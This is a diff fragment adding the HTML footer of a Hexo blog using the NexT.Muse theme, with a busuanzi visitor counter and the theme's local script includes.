+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
